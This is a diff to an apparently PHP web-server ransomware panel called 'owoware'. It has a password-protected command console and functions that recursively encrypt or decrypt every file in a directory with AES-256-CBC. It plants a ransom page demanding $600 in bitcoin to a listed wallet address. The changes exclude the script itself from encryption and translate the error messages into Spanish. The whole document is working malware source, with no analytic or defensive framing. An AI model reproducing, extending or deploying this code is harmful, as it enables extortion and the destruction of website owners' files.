@@ -3,6 +3,7 @@ session_start();
 
 define('USERNAME', 'admin');
 define('PASSWORD_HASH', '$2a$12$KQ8VZAlSZGB.OoLxOjctI.70Hh1zZz4TKzhgONqGyuj1NnTormViq');
+define('EXCLUDED_FILES', ['index.html', 'index.php', 'owoware.php']);
 
 if (!isset($_SESSION['login_attempts'])) {
     $_SESSION['login_attempts'] = 0;
@@ -80,7 +81,7 @@ if (isset($_POST['ajax']) && $_POST['ajax'] === '1' && isset($_POST['command']))
     $base_command = strtolower($parts[0]);
 
     if (in_array($base_command, $allowed_commands)) {
-        if ($base_command === 'clear') {
+        if (in_array($base_command, ['clear'])) {
             echo json_encode(['status' => 'success', 'output' => 'clear']);
             exit();
         }
@@ -112,7 +113,6 @@ function encrypt_directory($target_dir, $key, &$processed_files, &$error_files) 
         return;
     }
 
-    
     create_index_file($target_dir, $error_files);
 
     $iterator = new RecursiveIteratorIterator(
@@ -123,7 +123,8 @@ function encrypt_directory($target_dir, $key, &$processed_files, &$error_files) 
     foreach ($iterator as $item) {
         $filename = $item->getFilename();
         if ($item->isFile()) {
-            if (in_array(strtolower($filename), ['index.html', 'index.php'])) {
+            
+            if (in_array(strtolower($filename), EXCLUDED_FILES)) {
                 continue;
             }
 
@@ -131,27 +132,27 @@ function encrypt_directory($target_dir, $key, &$processed_files, &$error_files) 
             $relative_path = substr($file_path, strlen($target_dir));
             $file_contents = @file_get_contents($file_path);
             if ($file_contents === false) {
-                $error_files[] = $relative_path . " (Error reading)";
+                $error_files[] = $relative_path . " (Error leyendo)";
                 continue;
             }
 
             $iv_length = openssl_cipher_iv_length('AES-256-CBC');
             $iv = openssl_random_pseudo_bytes($iv_length);
             if ($iv === false) {
-                $error_files[] = $relative_path . " (Error generating IV)";
+                $error_files[] = $relative_path . " (Error generando IV)";
                 continue;
             }
 
             $encrypted_contents = openssl_encrypt($file_contents, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
             if ($encrypted_contents === false) {
-                $error_files[] = $relative_path . " (Error encrypting)";
+                $error_files[] = $relative_path . " (Error cifrando)";
                 continue;
             }
 
             $final_content = $iv . $encrypted_contents;
             $result = @file_put_contents($file_path, $final_content);
             if ($result === false) {
-                $error_files[] = $relative_path . " (Error writing)";
+                $error_files[] = $relative_path . " (Error escribiendo)";
                 continue;
             }
 
@@ -171,7 +172,6 @@ function decrypt_directory($target_dir, $key, &$processed_files, &$error_files) 
         return;
     }
 
-    
     create_index_file($target_dir, $error_files);
 
     $iterator = new RecursiveIteratorIterator(
@@ -182,7 +182,8 @@ function decrypt_directory($target_dir, $key, &$processed_files, &$error_files) 
     foreach ($iterator as $item) {
         $filename = $item->getFilename();
         if ($item->isFile()) {
-            if (in_array(strtolower($filename), ['index.html', 'index.php'])) {
+            
+            if (in_array(strtolower($filename), EXCLUDED_FILES)) {
                 continue;
             }
 
@@ -190,13 +191,13 @@ function decrypt_directory($target_dir, $key, &$processed_files, &$error_files) 
             $relative_path = substr($file_path, strlen($target_dir));
             $file_contents = @file_get_contents($file_path);
             if ($file_contents === false) {
-                $error_files[] = $relative_path . " (Error reading)";
+                $error_files[] = $relative_path . " (Error leyendo)";
                 continue;
             }
 
             $iv_length = openssl_cipher_iv_length('AES-256-CBC');
             if (strlen($file_contents) < $iv_length) {
-                $error_files[] = $relative_path . " (Content too short for IV)";
+                $error_files[] = $relative_path . " (Contenido demasiado corto para IV)";
                 continue;
             }
             $iv = substr($file_contents, 0, $iv_length);
@@ -204,13 +205,13 @@ function decrypt_directory($target_dir, $key, &$processed_files, &$error_files) 
 
             $decrypted_contents = openssl_decrypt($encrypted_contents, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
             if ($decrypted_contents === false) {
-                $error_files[] = $relative_path . " (Error decrypting)";
+                $error_files[] = $relative_path . " (Error descifrando)";
                 continue;
             }
 
             $result = @file_put_contents($file_path, $decrypted_contents);
             if ($result === false) {
-                $error_files[] = $relative_path . " (Error writing)";
+                $error_files[] = $relative_path . " (Error escribiendo)";
                 continue;
             }
 
@@ -243,7 +244,7 @@ function create_index_file($dir_path, &$error_files) {
 <h2>Ooops, your files have been encrypted!</h2>
 
 Your files will be lost
-Send $600 worth of bitcoin to this address:
+Send \$600 worth of bitcoin to this address:
 bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf8ch7
 </pre></center></b>
         ";
@@ -266,7 +267,7 @@ bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf8ch7
 <h2>Ooops, your files have been encrypted!</h2>
 
 Your files will be lost
-Send $600 worth of bitcoin to this address:
+Send \$600 worth of bitcoin to this address:
 bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf8ch7
 </pre></center></b>
         ";
